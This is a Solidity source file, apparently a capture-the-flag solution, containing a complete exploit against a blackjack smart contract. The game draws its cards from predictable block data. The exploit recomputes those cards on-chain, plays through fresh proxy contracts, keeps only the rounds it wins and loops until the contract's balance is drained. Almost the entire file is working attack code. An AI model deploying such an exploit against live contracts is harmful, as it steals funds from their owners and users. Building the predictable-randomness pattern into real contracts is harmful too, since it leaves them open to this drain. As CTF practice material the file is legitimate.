// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-ctf/CTFSolver.sol";
import "../src/Challenge.sol";

interface IBlackJack {
    function deal() external payable;
    function hit() external;
    function stand() external;

    function games(address) external view returns (address, uint256, uint8, uint8);

    function maxBet() external returns (uint256);
    function minBet() external returns (uint256);
}

library Deck {
    function deal(address player, uint8 cardNumber) internal view returns (uint8) {
        uint256 b = block.number;
        uint256 timestamp = block.timestamp;
        return uint8(uint256(keccak256(abi.encodePacked(blockhash(b), player, cardNumber, timestamp))) % 52);
    }

    function valueOf(uint8 card, bool isBigAce) internal pure returns (uint8) {
        uint8 value = card / 4;
        if (value == 0 || value == 11 || value == 12) {
            // Face cards
            return 10;
        }
        if (value == 1 && isBigAce) {
            // Ace is worth 11
            return 11;
        }
        return value;
    }

    function isAce(uint8 card) internal pure returns (bool) {
        return card / 4 == 1;
    }

    function isTen(uint8 card) internal pure returns (bool) {
        return card / 4 == 10;
    }
}

library Game {
    uint8 private constant BLACKJACK = 21;

    // @param finishGame - whether to finish the game or not (in case of Blackjack the game finishes anyway)
    function checkGameResult(uint8[] memory houseCards, uint8[] memory playerCards) internal pure returns (uint256) {
        // calculate house score
        (uint8 houseScore, uint8 houseScoreBig) = calculateScore(houseCards);
        // calculate player score
        (uint8 playerScore, uint8 playerScoreBig) = calculateScore(playerCards);

        if (houseScoreBig == BLACKJACK || houseScore == BLACKJACK) {
            if (playerScore == BLACKJACK || playerScoreBig == BLACKJACK) {
                // TIE
                return 0;
            } else {
                // HOUSE WON
                return 0;
            }
        } else {
            if (playerScore == BLACKJACK || playerScoreBig == BLACKJACK) {
                // PLAYER WON
                if (playerCards.length == 2 && (Deck.isTen(playerCards[0]) || Deck.isTen(playerCards[1]))) {
                    // Natural blackjack => return x2.5
                    return 2;
                } else {
                    // Usual blackjack => return x2
                    return 1;
                }
            } else {
                if (playerScore > BLACKJACK) {
                    // BUST, HOUSE WON
                    return 0;
                }

                // недобор
                uint8 playerShortage = 0;
                uint8 houseShortage = 0;

                // player decided to finish the game
                if (playerScoreBig > BLACKJACK) {
                    if (playerScore > BLACKJACK) {
                        // HOUSE WON
                        return 0;
                    } else {
                        playerShortage = BLACKJACK - playerScore;
                    }
                } else {
                    playerShortage = BLACKJACK - playerScoreBig;
                }

                if (houseScoreBig > BLACKJACK) {
                    if (houseScore > BLACKJACK) {
                        // PLAYER WON
                        return 1;
                    } else {
                        houseShortage = BLACKJACK - houseScore;
                    }
                } else {
                    houseShortage = BLACKJACK - houseScoreBig;
                }

                // ?????????????????????? почему игра заканчивается?
                if (houseShortage == playerShortage) {
                    // TIE
                    return 0;
                } else if (houseShortage > playerShortage) {
                    // PLAYER WON
                    return 1;
                } else {
                    return 0;
                }
            }
        }
    }

    function calculateScore(uint8[] memory cards) internal pure returns (uint8, uint8) {
        uint8 score = 0;
        uint8 scoreBig = 0; // in case of Ace there could be 2 different scores
        bool bigAceUsed = false;
        for (uint256 i = 0; i < cards.length; ++i) {
            uint8 card = cards[i];
            if (Deck.isAce(card) && !bigAceUsed) {
                // doesn't make sense to use the second Ace as 11, because it leads to the losing
                scoreBig += Deck.valueOf(card, true);
                bigAceUsed = true;
            } else {
                scoreBig += Deck.valueOf(card, false);
            }
            score += Deck.valueOf(card, false);
        }
        return (score, scoreBig);
    }
}

contract Child {
    IBlackJack private immutable BLACKJACK;

    constructor(IBlackJack blackjack) payable {
        BLACKJACK = IBlackJack(blackjack);
    }

    function run() external payable {
        BLACKJACK.deal{value: msg.value}();

        if (address(this).balance > msg.value) {
            payable(msg.sender).transfer(address(this).balance);
            return;
        }

        uint8[] memory houseCards = new uint8[](1);
        uint8[] memory playerCards = new uint8[](2);

        uint8 cardsDealt = 0;

        playerCards[0] = Deck.deal(address(this), cardsDealt++);
        houseCards[0] = Deck.deal(address(this), cardsDealt++);
        playerCards[1] = Deck.deal(address(this), cardsDealt++);

        while (true) {
            uint8[] memory playerCardsAfterHitting = new uint8[](playerCards.length + 1);
            for (uint256 i = 0; i < playerCards.length; i++) {
                playerCardsAfterHitting[i] = playerCards[i];
            }
            playerCardsAfterHitting[playerCards.length] = Deck.deal(address(this), cardsDealt);

            (uint8 playerScore, uint8 playerScoreBig) = Game.calculateScore(playerCardsAfterHitting);
            if (playerScore > 21 && playerScoreBig > 21) break; // don't continue

            BLACKJACK.hit();
            playerCards = playerCardsAfterHitting;
            cardsDealt++;

            if (address(this).balance > msg.value) {
                payable(msg.sender).transfer(address(this).balance);
                return;
            }
        }

        // if we didn't hit blackjack, try standing
        while (true) {
            (, uint8 houseScoreBig) = Game.calculateScore(houseCards);
            if (houseScoreBig >= 17) break;

            uint8[] memory newHouseCards = new uint8[](houseCards.length + 1);
            for (uint256 i = 0; i < houseCards.length; i++) {
                newHouseCards[i] = houseCards[i];
            }
            newHouseCards[houseCards.length] = Deck.deal(address(this), cardsDealt++);

            houseCards = newHouseCards;
        }

        uint256 result = Game.checkGameResult(houseCards, playerCards);
        require(result == 1);

        BLACKJACK.stand();

        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}

contract Proxy {
    address private immutable IMPLEMENTATION;

    constructor(address impl) {
        IMPLEMENTATION = impl;
    }

    fallback() external payable {
        address impl = IMPLEMENTATION;
        assembly {
            calldatacopy(0x00, 0x00, calldatasize())
            let result := delegatecall(gas(), impl, 0x00, calldatasize(), 0x00, 0x00)
            returndatacopy(0x00, 0x00, returndatasize())
            if iszero(result) { revert(0x00, returndatasize()) }
            return(0x00, returndatasize())
        }
    }
}

contract Exploit {
    Challenge private immutable CHALLENGE;

    constructor(Challenge challenge) {
        CHALLENGE = challenge;
    }

    function exploit() external payable {
        console.log("solved?", CHALLENGE.isSolved());

        IBlackJack blackjack = IBlackJack(CHALLENGE.BLACKJACK());
        Child child = new Child(blackjack);

        while (address(blackjack).balance > 0) {
            if (address(blackjack).balance < blackjack.minBet()) {
                payable(address(blackjack)).transfer(blackjack.minBet() - address(blackjack).balance);
            }

            uint256 betSize = address(blackjack).balance;
            if (betSize > blackjack.maxBet()) betSize = blackjack.maxBet();

            Child proxy = Child(payable(address(new Proxy(address(child)))));
            try proxy.run{value: betSize}() {} catch {}
        }

        console.log("solved?", CHALLENGE.isSolved());
    }

    receive() external payable {}
}

contract Solve is CTFSolver {
    function solve(address challenge, address) internal override {
        new Exploit(Challenge(challenge));
    }
}
